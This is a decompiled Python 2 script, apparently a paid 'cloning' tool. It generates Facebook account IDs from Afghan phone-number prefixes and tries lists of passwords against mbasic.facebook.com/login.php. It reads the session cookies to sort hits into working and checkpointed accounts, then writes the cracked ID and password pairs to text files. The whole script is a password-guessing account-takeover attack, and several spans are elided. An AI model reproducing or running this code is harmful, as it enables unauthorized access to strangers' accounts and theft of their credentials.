# Decompile by :  ABO ZADA 
# Time Succes decompile : 2023-08-24 10:08:47.173597
...
logo = "'\x1b[1;92m'  ..%%%%...%%%%%%...%%%%...%%..... \n'\x1b[1;91m'   Author      :     ABO ZADA     .%%..%%....%%....%%..%%..%%..... \n'\x1b[1;92m'   Github      :     ALHAM123456   .%%%%%%....%%....%%%%%%..%%..... \n'\x1b[1;93m'   FB ID       :     ALHAMUDEEN ATAL    .%%..%%....%%....%%..%%..%%.....  \n'\x1b[1;94m'   TOOL TYPE   :     PAID COMMANDS      .%%..%%....%%....%%..%%..%%%%%%.   \n'\x1b[1;96m'   WAP NUMBER  :     0093789937452 
dec = '2'
server = '2'
...
def main_apv():
    ...
    try:
        ...
        print ''
        print '     '
        raw_input(' send key to admin    ')
        os.system('xdg-open https://wa.me/0093789937452')
    ...
    if key1 in r1:
        ...
        print ''
        print '     '
        raw_input(' boy only one key you can enter in command   ')
        os.system('xdg-open https://wa.me/0093789937452')
...
def main_input():
    ...
    if mx == '1':
        ...
        print '\x1b[1;92m        Member In atal Paid Commands '
        print '\x1b[1;91m        
        time.sleep(3.5)
        main_system()
    elif mx == '6':
...
def numcloning():
    ...
    print logo
    print ''
    print '    \x1b[1;91m\n    [ Afghanistan Random Number Cloning ]'
    print ''
    print '\x1b[1;92m\n   [*] Enter First 4 Latter Of Any Network : '
    print '\x1b[1;93m\n     Example 9377  9370 9378 9374 '
    print ''
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data = {
                        ...
                        'login': 'submit' })
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[ATAL-OK] ' + uid + ' | ' + pass3
                        ok = open('IMTIAZ-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[ATAL-CP] ' + uid + ' | ' + pass3
                        cp = open('IMTIAZ-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data = {
                            ...
                            'login': 'submit' })
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[ATAL-OK] ' + uid + ' | ' + pass4
                            ok = open('IMTIAZ-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[ATAL-CP] ' + uid + ' | ' + pass4
                            cp = open('IMTIAZ-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                ...
                                'login': 'submit' })
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[ATAL-OK] ' + uid + ' | ' + pass5
                                ok = open('IMTIAZ-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[ATAL-CP] ' + uid + ' | ' + pass5
                                cp = open('IMTIAZ-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data = {
                ...
                'login': 'submit' })
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[ATAL-OK] ' + uid + ' | ' + pass1
                ok = open('IMTIAZ-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[ATAL-CP] ' + uid + ' | ' + pass1
                cp = open('IMTIAZ-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                    ...
                    'login': 'submit' })
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[ATAL-OK] ' + uid + ' | ' + pass2
                    ok = open('IMTIAZ-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[ATAL-CP] ' + uid + ' | ' + pass2
                    cp = open('IMTIAZ-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        print '\x1b[1;97m[ATAL-CP] ' + uid + ' | ' + pass3
                        cp = open('IMTIAZ-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;97m[ATAL-CP] ' + uid + ' | ' + pass4
                            cp = open('IMTIAZ-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                print '\x1b[1;97m[ATAL-CP] ' + uid + ' | ' + pass5
                                cp = open('IMTIAZ-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            print '\x1b[1;91m[ATSL-CP] ' + uid + ' | ' + pass4
                            cp = open('IMTIAZ-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                b = rana.post('https://mbasic.facebook.com/login.php', data = {
                                    ...
                                    'login': 'submit' })
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[ATAL-OK] ' + uid + ' | ' + pass6
                                    ok = open('IMTISZ-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[ATAL-CP] ' + uid + ' | ' + pass6
                                    cp = open('IMTIAZ-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
